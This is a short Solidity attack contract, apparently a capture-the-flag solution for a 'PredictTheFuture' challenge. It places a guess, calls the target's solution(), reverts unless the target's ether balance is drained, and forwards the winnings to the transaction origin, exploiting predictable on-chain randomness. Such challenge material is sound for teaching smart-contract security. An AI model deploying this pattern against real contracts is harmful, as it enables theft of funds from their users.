// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

interface IPredictTheFuture {
    function setGuess(uint8 n) external payable;
    function solution() external;
}

contract PredictTheFutureAttack {
    IPredictTheFuture public predictTheFuture;

    constructor(address _predictTheFutureAddress) {
        predictTheFuture = IPredictTheFuture(_predictTheFutureAddress);
    }

    function setGuess(uint8 n) external payable {
        predictTheFuture.setGuess{value: 0.01 ether}(n);
    }

    function attack() external payable returns(bool){
        predictTheFuture.solution();
        require(address(predictTheFuture).balance == 0, "Challenge not completed");
        payable(tx.origin).transfer(address(this).balance);
        return true;
    }

    receive() external payable {}
}